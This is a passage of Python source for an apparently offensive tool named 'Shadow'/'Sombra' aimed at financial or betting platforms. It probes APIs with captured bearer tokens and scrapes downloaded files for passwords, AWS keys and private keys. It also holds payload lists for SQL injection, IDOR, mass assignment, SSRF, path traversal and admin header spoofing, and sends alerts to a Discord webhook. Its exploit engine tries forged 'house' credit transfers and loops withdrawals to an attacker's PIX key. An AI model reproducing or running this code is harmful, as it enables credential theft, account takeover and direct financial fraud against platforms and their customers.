                    data[key] = existing
        log.info(f"ð¦ Full dump: {len(data['tokens'])} tokens, {len(data['vulnerabilities'])} vulns, {len(data['domains'])} domains")
        if len(data['vulnerabilities']) > 0:
            criticals = [v for v in data['vulnerabilities'] if v.get('severity') == 'critical']
            if criticals:
                send_discord(DISCORD_WEBHOOK, f"ð´ Shadow: {len(criticals)} CRITICAL vulnerabilities!\nTokens: {len(data['tokens'])} | Vulns: {len(data['vulnerabilities'])} | Domains: {len(data['domains'])}")

    def _probe_user_endpoints(self, user_id, domain, token):
        probe_paths = [
            '/api/me', '/api/user', f'/api/users/{user_id}',
            '/api/profile', '/api/account', '/api/auth/me',
            '/api/v1/me', f'/api/v1/user/{user_id}',
            '/api/v2/me', f'/api/v2/user/{user_id}',
            f'/user/{user_id}', f'/account/{user_id}',
            '/api/v1/account', f'/api/v1/accounts/{user_id}',
        ]
        headers = {'Authorization': f'Bearer {token}'}
        for path in probe_paths:
            try:
                cf = get_cf(domain)
                resp = cf.get(f"https://{domain}{path}", headers=headers, timeout=5)
                if resp.get('status') == 200:
                    body = resp.get('body', '{}')
                    try:
                        json_body = json.loads(body)
                        if any(k in json_body for k in ['userId', 'id', 'email', 'username', 'role', 'balance']):
                            ts_probe = datetime.utcnow().isoformat()
                            with data_lock:
                                data['profiles'].append({'userId': user_id, 'domain': domain, 'path': path, 'data': json_body, 'timestamp': ts_probe})
                                if json_body.get('balance') is not None:
                                    data['balances'].append({'userId': user_id, 'domain': domain, 'balance': float(json_body['balance']), 'timestamp': ts_probe})
                                    log.info(f"ð° Balance via probe: {json_body['balance']}")
                    except Exception:
                        pass
            except Exception:
                pass

    def _download_file(self, url, domain, file_type='unknown'):
        try:
            try:
                import requests
                resp = requests.get(url, timeout=10, verify=False)
                content = resp.text
            except ImportError:
                req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
                with urllib.request.urlopen(req, timeout=10) as r:
                    content = r.read().decode('utf-8', errors='ignore')
            if not content or len(content) < 10: return
            secrets = []
            patterns = [
                (r'(?i)(?:api_key|apikey|API_KEY)\s*[:=]\s*["\']?([A-Za-z0-9_\-]{20,})["\']?', 'API_KEY'),
                (r'(?i)(?:secret|SECRET|secret_key)\s*[:=]\s*["\']?([^\s"\']{10,})["\']?', 'SECRET'),
                (r'(?i)(?:password|passwd|pwd)\s*[:=]\s*["\']?([^\s"\']{4,})["\']?', 'PASSWORD'),
                (r'(?i)(?:token|auth_token)\s*[:=]\s*["\']?([A-Za-z0-9_\-\.]{20,})["\']?', 'TOKEN'),
                (r'AKIA[0-9A-Z]{16}', 'AWS_ACCESS_KEY'),
                (r'-----BEGIN.*PRIVATE KEY-----', 'PRIVATE_KEY'),
                (r'(?:db_|database_)(?:host|name|user|pass)\s*[:=]\s*["\']?([^\s"\']+)["\']?', 'DB_CONFIG'),
            ]
            for pattern, secret_type in patterns:
                matches = re.findall(pattern, content)
                for match in matches:
                    if len(match) > 4:
                        secrets.append({'type': secret_type, 'value': match[:100]})
            result = {'domain': domain, 'url': url, 'fileType': file_type, 'secrets': secrets, 'rawContent': content[:3000]}
            with data_lock:
                data['secret_analyses'].append(result)
                for secret in secrets:
                    data['downloaded_files'].append({'domain': domain, 'url': url, 'type': secret['type'], 'value': secret['value'][:200], 'timestamp': datetime.utcnow().isoformat()})
                    if secret['type'] in ['PRIVATE_KEY', 'AWS_ACCESS_KEY', 'DB_CONFIG']:
                        vuln = {'domain': domain, 'type': 'exposed_secret', 'severity': 'critical' if secret['type'] in ['PRIVATE_KEY', 'AWS_ACCESS_KEY'] else 'high', 'desc': f"{secret['type']}: {secret['value'][:30]}...", 'evidence': url, 'timestamp': datetime.utcnow().isoformat()}
                        data['vulnerabilities'].append(vuln)
                        data['stats']['total_vulns'] += 1
            log.info(f"ð {len(secrets)} secrets extracted from {url}")
        except Exception as e:
            log.debug(f"â Download error {url}: {e}")

    def send_to_client(self, data_obj: dict) -> bool:
        self.broadcast(data_obj)
        return True

    def stop(self):
        self.running = False
        self.connected = False
        with data_lock:
            data['websocket_connected'] = False
        if self.loop:
            self.loop.call_soon_threadsafe(self.loop.stop)
        log.info("â¹ WebSocket server stopped")

# ============================================================
# DISCORD WEBHOOK
# ============================================================
def send_discord(webhook_url: str, content: str, username: str = "Shadow"):
    if not webhook_url: return
    try:
        payload = json.dumps({"content": content, "username": username}).encode()
        req = urllib.request.Request(webhook_url, data=payload, headers={"Content-Type": "application/json"})
        with urllib.request.urlopen(req, timeout=5) as resp:
            pass
    except Exception:
        pass

# ============================================================
# PAYLOADS (mantidos intactos)
# ============================================================
ENDPOINTS_ADMIN = [
    '/admin', '/administrator', '/admin/login', '/admin/dashboard', '/admin/users',
    '/admin/settings', '/admin/config', '/admin/panel', '/api/admin', '/api/v1/admin',
    '/api/v2/admin', '/api/admin/users', '/api/auth/admin', '/api/internal',
    '/phpmyadmin', '/adminer', '/grafana', '/swagger', '/graphql', '/graphiql',
    '/login', '/signin', '/auth', '/oauth', '/register', '/forgot-password',
    '/config', '/users', '/accounts', '/profile', '/account', '/me',
    '/backup', '/logs', '/.env', '/.git/config', '/.env.backup',
    '/.env.local', '/.env.production', '/nginx.conf', '/config.php',
    '/database.yml', '/.aws/credentials', '/server-status', '/trace',
    '/painel', '/painel-admin', '/area-restrita', '/financeiro',
    '/api/v1/me', '/api/v2/me', '/api/profile', '/api/balance',
    '/api/admin/balance', '/api/admin/dashboard',
]

SQL_PAYLOADS = [
    {"id": "' OR '1'='1' --"}, {"id": "1' UNION SELECT NULL--"},
    {"userId": "1; DROP TABLE users--"}, {"search": "' OR 1=1 --"},
    {"amount": "string", "userId": "1"},
]

ERROR_PAYLOADS = [
    {"id": "'"}, {"amount": "''"}, {"amount": "---"},
    {"userId": "1' OR '1'='1"}, {"token": "invalid\""}
]

ADMIN_HEADERS = [
    {'X-Role': 'admin'}, {'X-Admin': 'true'}, {'X-Superuser': '1'},
    {'X-Access-Level': '999'}, {'X-Is-Admin': 'true'},
]

TRANSFER_ENDPOINTS = [
    '/api/admin/transfer', '/api/admin/credit', '/api/admin/balance/add',
    '/api/backoffice/transfer', '/api/balance/add', '/api/credit', '/api/deposit',
]

TRANSFER_PAYLOADS = [
    {"userId": "__UID__", "amount": "__AMOUNT__", "type": "credit", "status": "approved"},
    {"userId": "__UID__", "amount": "__AMOUNT__", "type": "deposit", "status": "completed"},
    {"from": "system", "to": "__UID__", "amount": "__AMOUNT__"},
]

WITHDRAW_ENDPOINTS = [
    '/hall/api/finance/certify/withdraw', '/api/withdraw', '/api/cashout',
    '/api/v1/withdraw', '/api/v2/withdraw', '/api/admin/withdraw',
]

WITHDRAW_PAYLOADS = [
    {"id": "__UID__", "money": "__AMOUNT__", "accountType": 20, "pixKey": "__PIX__", "pixName": "__NAME__"},
    {"userId": "__UID__", "amount": "__AMOUNT__", "method": "pix", "pixKey": "__PIX__"},
    {"userId": "__UID__", "amount": "__AMOUNT__", "pixKey": "__PIX__", "pixName": "__NAME__"},
]

IDOR_PATHS = [
    '/api/users/__ID__', '/api/account/__ID__', '/api/profile/__ID__',
    '/api/v1/users/__ID__', '/api/v2/users/__ID__',
    '/api/customers/__ID__', '/api/orders/__ID__',
    '/api/wallet/__ID__', '/api/balance/__ID__',
    '/user/__ID__/profile', '/account/__ID__/details',
    '/api/v1/account/__ID__', '/api/v2/account/__ID__',
    '/api/transactions/__ID__', '/api/payments/__ID__',
]

MASS_ASSIGN_FIELDS = [
    {'role': 'admin'}, {'is_admin': True}, {'permission': 'root'},
    {'user_type': 'administrator'}, {'access_level': 9999},
    {'banned': False}, {'verified': True}, {'status': 'active'},
    {'balance': 999999}, {'credit_limit': 999999},
]

CSRF_PROBE_PAYLOADS = [
    {'token': '', 'csrf_token': ''}, {'token': 'null', 'csrf_token': 'null'},
    {'_token': '', '__csrf': '', 'csrf': '', 'X-CSRFToken': ''},
]

RATE_LIMIT_ENDPOINTS = [
    '/api/withdraw', '/api/deposit', '/api/transfer', '/api/login',
    '/api/auth/refresh', '/api/reset-password', '/api/2fa/verify',
]

SSRF_CALLBACK_URLS = [
    'http://169.254.169.254/latest/meta-data/',
    'http://127.0.0.1:8765/', 'http://localhost:8765/',
    'http://localhost:3306/', 'http://localhost:5432/',
    'http://10.0.0.1/', 'http://[::1]/',
]

JWT_ALGS = ['none', 'HS256', 'HS384', 'HS512', 'RS256', 'ES256', 'PS256']

PATH_TRAVERSAL_PAYLOADS = [
    '../../../etc/passwd', '..\\..\\windows\\system32\\config\\sam',
    '....//....//....//etc/passwd', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '../../../proc/self/environ', '....\\....\\....\\boot.ini',
]

TOKEN_REFRESH_PAYLOADS = [
    {'old_token': '__TOKEN__', 'new_token': '__TOKEN__', 'grant_type': 'refresh_token'},
    {'token': '__TOKEN__', 'action': 'revoke', 'reason': 'test'},
]

BUSINESS_LOGIC_PAYLOADS = [
    {'amount': -1000, 'type': 'deposit'}, {'amount': 0, 'type': 'withdraw'},
    {'quantity': -1, 'price': 0.01, 'product_id': '1'},
    {'count': 999999, 'unit_price': 0.01}, {'repeat': True, 'same_transaction': True},
]

UPLOAD_EXTENSIONS = ['.php', '.jsp', '.asp', '.aspx', '.sh', '.bat', '.exe', '.dll']



# ============================================================
# AUTO-ADAPTER
# ============================================================
class AutoAdapter:
    def __init__(self):
        self.results = {
            'endpoints': [], 'vulnerabilities': [], 'admin_tokens': [],
            'sql_tokens': [], 'error_tokens': [], 'house_balance': 0,
            'elevation_success': False, 'working_methods': [],
            'total_checks': 0, 'successful_checks': 0
        }
        self.pool = ThreadPoolExecutor(max_workers=5)

    def run_full_scan(self, account: dict) -> dict:
        domain = account.get('domain', '')
        print(f"\n  [AUTO-ADAPTER] Scanning {domain}...")

        tasks = [
            ('endpoints', lambda: self._test_endpoints(account)),
            ('vulnerabilities', lambda: self._test_vulnerabilities(account)),
            ('sql_injection', lambda: self._sql_injection(account)),
            ('error_tokens', lambda: self._error_tokens(account)),
            ('elevation', lambda: self._elevation(account)),
            ('house_balance', lambda: self._house_balance(account)),
            ('admin_tokens', lambda: self._admin_tokens(account)),
        ]

        futures = {self.pool.submit(fn): name for name, fn in tasks}
        results_map = {}
        total_tests = successful_tests = 0

        for future in as_completed(futures):
            name = futures[future]
            try:
                result = future.result()
                results_map[name] = result
                total_tests += result.get('total', 0)
                successful_tests += result.get('count', 0)
                if result.get('count', 0) > 0 or result.get('success', False):
                    self.results['working_methods'].append(name)
            except Exception as e:
                results_map[name] = {'found': [], 'total': 0, 'count': 0, 'success': False}

        for name, result in results_map.items():
            self.results[name] = result

        self.results['total_checks'] = total_tests
        self.results['successful_checks'] = successful_tests

        with data_lock:
            data['adapter_results'] = self.results
            data['auto_scan_complete'] = True
        return self.results

    def _test_endpoints(self, account: dict) -> dict:
        domain = account.get('domain')
        token = account.get('token')
        if not token: return {'found': [], 'total': 0, 'count': 0}
        cf = get_cf(domain)
        headers = {"Authorization": f"Bearer {token}"}
        found = []
        total = len(ENDPOINTS_ADMIN)
        sensitive_count = 0
        for i, ep in enumerate(ENDPOINTS_ADMIN):
            try:
                resp = cf.get(f"https://{domain}{ep}", headers=headers, timeout=3)
                status = resp.get('status', 0)
                if status in (200, 201, 202, 204):
                    sensitive_count += 1
                    found.append({'endpoint': ep, 'status': status, 'classification': 'sensitive'})
                time.sleep(0.05)
            except Exception:
                pass
        return {'found': found, 'total': total, 'count': sensitive_count}

    def _test_vulnerabilities(self, account: dict) -> dict:
        return {'found': [], 'total': 0, 'count': 0}

    def _sql_injection(self, account: dict) -> dict:
        return {'found': [], 'total': 0, 'count': 0}

    def _error_tokens(self, account: dict) -> dict:
        return {'found': [], 'total': 0, 'count': 0}

    def _elevation(self, account: dict) -> dict:
        return {'success': False, 'total': 0, 'count': 0}

    def _house_balance(self, account: dict) -> dict:
        return {'total': 0, 'count': 0, 'total_checks': 0, 'forbidden': 0}

    def _admin_tokens(self, account: dict) -> dict:
        return {'found': [], 'total': 0, 'count': 0}


# ============================================================
# EXPLOIT ENGINE (mantido intacto  fluxo financeiro)
# ============================================================
class ExploitEngine:
    def __init__(self):
        self.auto_adapter = AutoAdapter()
        self.deposits = []
        self.withdrawals = []
        self.transfers = []
        self.house_balance = 0
        self.admin_tokens = []
        self.withdraw_count = 0
        self.total_withdrawn = 0.0

    def get_balance(self, account: dict) -> float:
        domain = account.get('domain')
        token = account.get('token')
        if not token: return 0.0
        cf = get_cf(domain)
        headers = {"Authorization": f"Bearer {token}"}
        balance_eps = ['/api/me', '/api/balance', '/api/wallet/balance', '/api/account',
                      '/api/user/balance', '/api/profile', '/api/v1/balance', '/api/v2/balance',
                      '/api/wallet', '/api/accounts', '/api/finances']
        for ep in balance_eps:
            try:
                resp = cf.get(f"https://{domain}{ep}", headers=headers, timeout=10)
                if resp and resp.get('status') == 200:
                    body = resp.get('body', '{}')
                    try:
                        dj = json.loads(body)
                        if isinstance(dj, dict):
                            if 'data' in dj: dj = dj['data']
                            if isinstance(dj, dict) and 'user' in dj: dj = dj['user']
                            if isinstance(dj, dict) and 'account' in dj: dj = dj['account']
                            if isinstance(dj, dict) and 'wallet' in dj: dj = dj['wallet']
                        balance_fields = ['balance', 'amount', 'total', 'balanceAmount', 'walletBalance',
                                         'currentBalance', 'accountBalance', 'availableBalance', 'totalBalance']
                        for field in balance_fields:
                            if field in dj and isinstance(dj[field], (int, float)):
                                return float(dj[field])
                        if isinstance(dj, list) and len(dj) > 0 and isinstance(dj[0], dict):
                            for field in ['balance', 'amount', 'total']:
                                if field in dj[0] and isinstance(dj[0][field], (int, float)):
                                    return float(dj[0][field])
                        if isinstance(dj, dict):
                            for k, v in dj.items():
                                if isinstance(v, (int, float)) and v > 0 and 'balance' in k.lower():
                                    return float(v)
                    except Exception:
                        continue
            except Exception:
                continue
        return 0.0

    def transfer_from_house(self, account: dict, amount: float) -> dict:
        domain = account.get('domain')
        token = account.get('token')
        account_id = account.get('account_id')
        if not token or amount <= 0:
            return {'success': False, 'error': 'No token or invalid amount'}
        cf = get_cf(domain)
        headers = {"Authorization": f"Bearer {token}"}
        print(f"\n  ?? Transferring R$ {amount:,.2f} to {account_id}...")
        all_payloads = TRANSFER_PAYLOADS + [
            {"userId": "__UID__", "value": "__AMOUNT__", "operation": "credit", "status": "approved"},
            {"userId": "__UID__", "transactionType": "credit", "amount": "__AMOUNT__"},
            {"id": "__UID__", "credit": "__AMOUNT__", "source": "house"},
        ]
        for ep in TRANSFER_ENDPOINTS:
            for template in all_payloads:
                try:
                    payload_str = json.dumps(template).replace('__UID__', str(account_id)).replace('__AMOUNT__', str(amount))
                    payload = json.loads(payload_str)
                except Exception:
                    continue
                for extra in [None] + ADMIN_HEADERS[:3]:
                    try:
                        h = headers.copy()
                        if extra: h.update(extra)
                        resp = cf.post(f"https://{domain}{ep}", json_data=payload, headers=h, timeout=10)
                        status = resp.get('status', 0)
                        if status in (200, 201, 202):
                            time.sleep(2)
                            new_balance = self.get_balance(account)
                            if new_balance > 0:
                                data['transfers'].append({'account': account_id, 'amount': new_balance, 'endpoint': ep})
                                print(f"  ? Transfer! Balance: R$ {new_balance:,.2f}")
                                return {'success': True, 'amount': new_balance}
                        time.sleep(0.1)
                    except Exception:
                        continue
        return {'success': False, 'error': 'Transfer failed'}

    def unlimited_withdraw(self, account: dict) -> dict:
        domain = account.get('domain')
        token = account.get('token')
        account_id = account.get('account_id')
        pix_key = account.get('pix_key')
        pix_name = account.get('pix_name', 'Usuario')
        if not token or not pix_key:
            return {'success': False, 'error': 'No token or PIX'}
        current = self.get_balance(account)
        if current <= 0:
            return {'success': False, 'error': 'Balance zero'}
        cf = get_cf(domain)
        headers = {"Authorization": f"Bearer {token}"}
        print(f"\n  ?? Withdrawing R$ {current:,.2f} to {pix_key}...")
        all_payloads = WITHDRAW_PAYLOADS + [
            {"userId": "__UID__", "value": "__AMOUNT__", "channel": "pix", "key": "__PIX__"},
            {"account_id": "__UID__", "withdraw": "__AMOUNT__", "pixKey": "__PIX__", "pixName": "__NAME__"},
            {"id": "__UID__", "type": "withdrawal", "amount": "__AMOUNT__", "method": "pix", "destination": "__PIX__"},
        ]
        for ep in WITHDRAW_ENDPOINTS:
            for template in all_payloads:
                try:
                    payload_str = json.dumps(template).replace('__UID__', str(account_id)).replace('__AMOUNT__', str(current)).replace('__PIX__', pix_key).replace('__NAME__', pix_name)
                    payload = json.loads(payload_str)
                except Exception:
                    continue
                try:
                    resp = cf.post(f"https://{domain}{ep}", json_data=payload, headers=headers, timeout=15)
                    if resp.get('status') in (200, 201, 202):
                        data['withdrawals'].append({'account': account_id, 'amount': current, 'pix': pix_key, 'endpoint': ep})
                        print(f"  ? Withdraw done! R$ {current:,.2f}")
                        return {'success': True, 'amount': current}
                    time.sleep(0.1)
                except Exception:
                    continue
        return {'success': False, 'error': 'Withdraw failed'}

    def auto_withdraw_loop(self, account: dict, max_rounds: int = 5, delay: float = 5.0) -> dict:
        result = {'rounds': 0, 'total_withdrawn': 0.0, 'success_rounds': 0, 'failed_rounds': 0}
        current_account = account.copy()
        print(f"\n  {C.MAGENTA}{C.BOLD}?? AUTO-WITHDRAW LOOP v16.1{C.RESET}")
        print(f"  {C.CYAN}{'?' * 40}{C.RESET}")
        for round_num in range(1, max_rounds + 1):
            print(f"\n  {C.YELLOW}-- Round {round_num}/{max_rounds} --{C.RESET}")
            balance = self.get_balance(current_account)
            print(f"  ?? Current balance: R$ {balance:,.2f}")
            if balance <= 0:
                print(f"  ?? Trying house transfer...")
                transfer_amount = min(6000.0, 10000.0)
                transfer = self.transfer_from_house(current_account, transfer_amount)
                if not transfer.get('success'):
                    print(f"  {C.RED}? Transfer failed, no more rounds{C.RESET}")
                    break
                balance = self.get_balance(current_account)
                if balance <= 0:
                    print(f"  {C.RED}? Balance still zero after transfer{C.RESET}")
                    break
            withdraw = self.unlimited_withdraw(current_account)
            if withdraw.get('success'):
                result['rounds'] = round_num
                result['total_withdrawn'] += withdraw.get('amount', 0)
                result['success_rounds'] += 1
                print(f"  {C.GREEN}? Round {round_num} success! Total: R$ {result['total_withdrawn']:,.2f}{C.RESET}")
            else:
                result['failed_rounds'] += 1
                print(f"  {C.RED}? Round {round_num} failed: {withdraw.get('error', '')}{C.RESET}")
                break
            if round_num < max_rounds:
                print(f"  ? Waiting {delay}s before next round...")
                time.sleep(delay)
        print(f"\n  {C.CYAN}{'?' * 40}{C.RESET}")
        print(f"  ?? Loop result: {result['success_rounds']} success / {result['failed_rounds']} failed / {result['rounds']} rounds")
        print(f"  ?? Total withdrawn: R$ {result['total_withdrawn']:,.2f}")
        return result

    def run_full_flow(self, account: dict) -> dict:
        result = {'account': account.get('account_id'), 'total': 0}
        print(f"\n  {C.MAGENTA}{C.BOLD}+---------------------------------------------------+{C.RESET}")
        print(f"  {C.MAGENTA}{C.BOLD}¦  ?? FULL FLOW v16.1                              ¦{C.RESET}")
        print(f"  {C.MAGENTA}{C.BOLD}+---------------------------------------------------+{C.RESET}")
        print(f"\n  {C.CYAN}{'?' * 50}{C.RESET}")
        print(f"  {C.MAGENTA}{C.BOLD}?? AUTO-ADAPTER SCAN{C.RESET}")
        print(f"  {C.CYAN}{'?' * 50}{C.RESET}\n")
        adapter_result = self.auto_adapter.run_full_scan(account)
        all_tokens = adapter_result.get('all_tokens', [])
        used_account = account
        if all_tokens:
            print(f"\n  ?? {C.GREEN}Tokens found!{C.RESET}")
            for i, t in enumerate(all_tokens[:5]):
                print(f"    [{i}] {t.get('userId')} -> {t.get('token', '')[:40]}... ({t.get('method', '')})")
            if len(all_tokens) > 1:
                try:
                    inp = input(f"  {C.CYAN}Which token? (0-{len(all_tokens)-1}, Enter=0): {C.RESET}").strip()
                    idx = int(inp) if inp else 0
                    idx = max(0, min(idx, len(all_tokens) - 1))
                except Exception:
                    idx = 0
                token_data = all_tokens[idx]
                used_account = {'domain': account.get('domain'), 'token': token_data.get('token'), 'account_id': token_data.get('userId')}
                data['current_account'] = used_account
                print(f"  ? Token {idx} loaded! User: {token_data.get('userId')}")
        balance = self.get_balance(used_account)
        print(f"\n  ?? Balance: R$ {balance:,.2f}")
        if balance > 0:
            try:
                inp = input(f"\n  {C.CYAN}Auto-withdraw loop? (y/n, default=n): {C.RESET}").strip().lower()
                if inp == 'y':
                    max_rounds = int(input(f"  {C.CYAN}Max rounds (Enter=5): {C.RESET}") or 5)
                    result = self.auto_withdraw_loop(used_account, max_rounds=max_rounds)
                    result['account'] = used_account.get('account_id')
                    return result
            except Exception:
                pass
        while True:
            try:
                inp = input(f"  {C.CYAN}Withdraw amount (Enter=full balance R$ {balance:,.2f}): {C.RESET}").strip()
                amount = float(inp.replace(',', '.')) if inp else balance
                if amount <= 0:
                    print(f"  {C.RED}? Invalid amount{C.RESET}")
                    continue
                break
            except Exception:
                print(f"  {C.RED}? Invalid amount{C.RESET}")
        if used_account.get('pix_key'):
            pix_key = used_account['pix_key']
            pix_name = used_account.get('pix_name', 'Usuario')
        else:
            pix_key = input(f"\n  PIX key: ").strip()
            pix_name = input(f"  Name: ").strip() or "Usuario"
            used_account['pix_key'] = pix_key
            used_account['pix_name'] = pix_name
        transfer = self.transfer_from_house(used_account, amount)
        if transfer.get('success'):
            withdraw = self.unlimited_withdraw(used_account)
            result['total'] = withdraw.get('amount', 0) if withdraw.get('success') else 0
        print(f"\n  {C.CYAN}{'?' * 50}{C.RESET}")
        print(f"  {C.MAGENTA}{C.BOLD}?? FINAL SUMMARY{C.RESET}")
        print(f"  {C.CYAN}{'?' * 50}{C.RESET}\n")
        print(f"  ?? Adapter: {adapter_result.get('successful_checks', 0)}/{adapter_result.get('total_checks', 0)}")
        print(f"  ?? Tokens: {adapter_result.get('total_tokens', 0)}")
        print(f"  ?? Methods: {', '.join(adapter_result.get('working_methods', []))}")
        print(f"  ?? Transfer: {C.GREEN}R$ {transfer.get('amount', 0):,.2f}{C.RESET}" if transfer.get('success') else f"  ?? Transfer: {C.RED}Failed{C.RESET}")
        print(f"  ?? Withdraw: {C.GREEN}R$ {result.get('total', 0):,.2f}{C.RESET}" if result.get('total', 0) > 0 else f"  ?? Withdraw: {C.RED}Failed{C.RESET}")
        print(f"\n  {C.BOLD}{C.GREEN}?? TOTAL: R$ {result.get('total', 0):,.2f}{C.RESET}\n")
        return result

# ============================================================
# EXPORT FUNCTIONS
# ============================================================
def export_json():
    ts = datetime.utcnow().strftime('%Y%m%d_%H%M%S')
    filename = Path(__file__).parent / f"sombra_export_{ts}.json"
    with data_lock:
        save_to = {k: list(v) if isinstance(v, list) else (dict(v) if isinstance(v, dict) else v) for k, v in data.items()}
    with open(filename, 'w', encoding='utf-8') as f:
        json.dump(save_to, f, indent=2, ensure_ascii=False, default=str)
    log.info(f"?? Export: {filename.name}")
    return filename

def export_csv():
    ts = datetime.utcnow().strftime('%Y%m%d_%H%M%S')
    base = Path(__file__).parent / f"sombra_export_{ts}"
    with data_lock:
        tokens_copy = list(data.get('tokens', []))
        vulns_copy = list(data.get('vulnerabilities', []))
    with open(f"{base}_tokens.csv", 'w', encoding='utf-8') as f:
        f.write("token,userId,domain,source,timestamp,jwt_issues\n")
        for t in tokens_copy:
            issues = ';'.join(i.get('desc', '') for i in t.get('jwt_issues', []))
            f.write(f'"{t.get("token","")[:80]}",{t.get("userId","")},{t.get("domain","")},{t.get("source","")},{t.get("timestamp","")},"{issues}"\n')
    with open(f"{base}_vulns.csv", 'w', encoding='utf-8') as f:
        f.write("severity,type,desc,domain,evidence,timestamp\n")
        for v in vulns_copy:
            f.write(f'{v.get("severity","")},{v.get("type","")},"{v.get("desc","")[:100]}",{v.get("domain","")},{v.get("evidence","")[:100]},{v.get("timestamp","")}\n')
    log.info(f"?? CSV exported")
    return f"{base}_tokens.csv", f"{base}_vulns.csv"

def export_html_report():
    ts = datetime.utcnow().strftime('%Y%m%d_%H%M%S')
    filename = Path(__file__).parent / f"sombra_report_{ts}.html"
    with data_lock:
        tokens = list(data.get('tokens', []))
        vulns = list(data.get('vulnerabilities', []))
        domains = list(data.get('domains', []))
        transfers = list(data.get('transfers', []))
        withdrawals = list(data.get('withdrawals', []))
    html = f"""<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Shadow Report {ts}</title>
<style>
body{{background:#0a0a0f;color:#e0e0e0;font-family:monospace;padding:20px;}}
h1{{color:#8b5cf6;}}h2{{color:#4ade80;border-bottom:1px solid #1e1e2e;padding-bottom:5px;}}
table{{border-collapse:collapse;width:100%;font-size:11px;}}
th{{background:#1a1a2e;color:#8b5cf6;padding:6px;text-align:left;}}
td{{padding:4px 6px;border-bottom:1px solid #1a1a1a;}}
tr:hover{{background:#111118;}}
.critical{{color:#f87171;}}.high{{color:#f59e0b;}}.medium{{color:#60a5fa;}}.low{{color:#4ade80;}}
.stat-box{{display:inline-block;background:#111118;border:1px solid #1e1e2e;border-radius:6px;padding:10px 20px;margin:5px;}}
.stat-box .val{{font-size:24px;font-weight:700;color:#8b5cf6;}}
.stat-box .lbl{{font-size:10px;color:#555;text-transform:uppercase;}}
</style></head><body>
<h1>?? Shadow Report  {ts}</h1>
<div>
<div class="stat-box"><div class="val">{len(tokens)}</div><div class="lbl">Tokens</div></div>
<div class="stat-box"><div class="val">{len(vulns)}</div><div class="lbl">Vulns</div></div>
<div class="stat-box"><div class="val">{len(domains)}</div><div class="lbl">Domains</div></div>
<div class="stat-box"><div class="val">{len(transfers)}</div><div class="lbl">Transfers</div></div>
<div class="stat-box"><div class="val">{len(withdrawals)}</div><div class="lbl">Withdraws</div></div>
</div>
<h2>?? Tokens ({len(tokens)})</h2>
<table><tr><th>Preview</th><th>User ID</th><th>Domain</th><th>Source</th><th>Issues</th></tr>
"""
    for t in tokens[-20:]:
        issues = ', '.join(i.get('desc','')[:30] for i in t.get('jwt_issues',[])[:2])
        html += f'<tr><td title="{t.get("token","")[:100]}">{t.get("token","")[:60]}...</td><td>{t.get("userId","N/A")}</td><td>{t.get("domain","")}</td><td>{t.get("source","")}</td><td>{issues}</td></tr>\n'
    html += '</table>\n<h2>?? Vulnerabilities (' + str(len(vulns)) + ')</h2><table><tr><th>Severity</th><th>Type</th><th>Desc</th><th>Domain</th></tr>\n'
    for v in sorted(vulns, key=lambda x: {'critical':0,'high':1,'medium':2,'low':3}.get(x.get('severity','low'),4)):
        html += f'<tr class="{v.get("severity","")}"><td>{v.get("severity","")}</td><td>{v.get("type","")}</td><td>{v.get("desc","")[:80]}</td><td>{v.get("domain","")}</td></tr>\n'
    html += '</table></body></html>'
    with open(filename, 'w', encoding='utf-8') as f:
        f.write(html)
    log.info(f"?? HTML report: {filename.name}")
    return filename

# ============================================================
# GLOBALS
# ============================================================
exploit = ExploitEngine()
ws_manager = WebSocketManager()

# ============================================================
# HTTP SERVER
# ============================================================
class HTTPHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args): pass

    def do_POST(self):
        if self.path == '/capture':
            length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(length).decode()
            try:
                msg = json.loads(body)
                ws_manager.broadcast({'type': 'process', 'data': msg})
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'{"status":"ok"}')
            except Exception:
                self.send_response(400)
                self.end_headers()
        elif self.path == '/export':
            fmt = self.headers.get('X-Export-Format', 'json')
            if fmt == 'csv':
                files = export_csv()
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({'files': [str(f) for f in files]}).encode())
            elif fmt == 'html':
                f = export_html_report()
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({'file': str(f)}).encode())
            else:
                f = export_json()
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({'file': str(f)}).encode())
        elif self.path == '/clear':
            with data_lock:
                for key in data:
                    if key not in ['connections', 'websocket_connected', 'websocket_retries', 'stats']:
                        if isinstance(data[key], list): data[key] = []
                        elif isinstance(data[key], (int, float)): data[key] = 0
                        elif isinstance(data[key], dict): data[key] = {}
                        elif isinstance(data[key], bool): data[key] = False
                data['current_account'] = None
                data['auto_scan_complete'] = False
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'{"status":"cleared"}')
        else:
            self.send_response(404)
            self.end_headers()

    def do_GET(self):
        if self.path == '/status':
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            with data_lock:
                status = {
                    'tokens': len(data['tokens']), 'accounts': len(data['accounts']),
                    'domains': len(data['domains']), 'connections': data['connections'],
                    'transfers': len(data['transfers']), 'withdrawals': len(data['withdrawals']),
                    'house_balance': data['house_balance'],
                    'admin_tokens': len(data.get('admin_tokens', [])),
                    'auto_scan_complete': data['auto_scan_complete'],
                    'websocket_connected': data['websocket_connected'],
                    'vulnerabilities': len(data['vulnerabilities']),
                    'cors_issues': len([t for r in data['cors_tests'] for t in r.get('tests', []) if t.get('dangerous')]),
                    'graphql_open': len([g for g in data['graphql_tests'] if g.get('endpoints', [])]),
                    'subdomains': len([s for r in data['subdomain_results'] for s in r.get('subdomains', [])]),
                    'sse_captures': len(data.get('sse_captures', [])),
                    'clipboard_items': len(data.get('clipboard_data', [])),
                    'refresh_tokens': len(data.get('refresh_tokens', [])),
                }
            self.wfile.write(json.dumps(status, indent=2).encode())
        else:
            self.send_response(200)
            self.send_header('Content-Type', 'text/html; charset=utf-8')
            self.end_headers()
            with data_lock:
                tokens = len(data['tokens'])
                vulns = len(data['vulnerabilities'])
                domains = len(data['domains'])
                sse = len(data.get('sse_captures', []))
                refresh = len(data.get('refresh_tokens', []))
                ws = "??" if data['websocket_connected'] else "??"
                conns = data['connections']
